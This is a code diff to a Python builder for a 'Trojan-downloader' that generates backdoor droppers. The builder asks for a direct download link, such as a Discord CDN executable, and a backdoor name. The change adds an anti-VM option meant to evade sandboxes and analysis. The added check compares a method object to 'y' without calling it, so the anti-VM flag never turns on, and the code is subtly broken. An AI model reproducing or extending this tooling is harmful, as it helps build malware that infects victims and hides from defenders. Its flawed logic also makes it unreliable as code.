@@ -48,7 +48,7 @@ def pause():
 #######
 
 class start_build():
-    def __init__(self, icon="exeic.ico", name="Trojan-downloader", downloadurl="") -> None:
+    def __init__(self, icon="exeic.ico", name="Trojan-downloader", downloadurl="", antivm = False) -> None:
         if icon == "":
             self.icon = "exeic.ico"
         else:
@@ -56,6 +56,7 @@ class start_build():
 
         self.name = name
         self.downloadurl = downloadurl
+        self.antivm = antivm
 
         if os.path.exists("downloader-initialization.py"):
             os.remove("downloader-initialization.py")
@@ -85,6 +86,7 @@ class start_build():
             content = f.read()
         
         newcontent = content.replace("{downloadurl}", self.downloadurl)
+        newcontent = newcontent.replace('"{antivm}"', str(self.antivm))
 
         with open("downloader-initialization.py", "w") as f:
             f.write(newcontent)
@@ -125,8 +127,13 @@ def main():
 
     directlink = input(f"{Fore.MAGENTA}Direct download link (cdn.discordapp.com/file.exe, etc) {Fore.WHITE}")
     name = input(f"{Fore.MAGENTA}Backdoor name {Fore.WHITE}")
+    antivminput = input(f"{Fore.MAGENTA}Anti VM (Y/N) {Fore.WHITE}")
+    if antivminput.lower == "y":
+        antivm = True
+    else:
+        antivm = False
 
-    start_build(icon=icon, name=name,downloadurl=directlink)
+    start_build(icon=icon, name=name, downloadurl=directlink, antivm=antivm)
 
 
 if __name__ == '__main__':
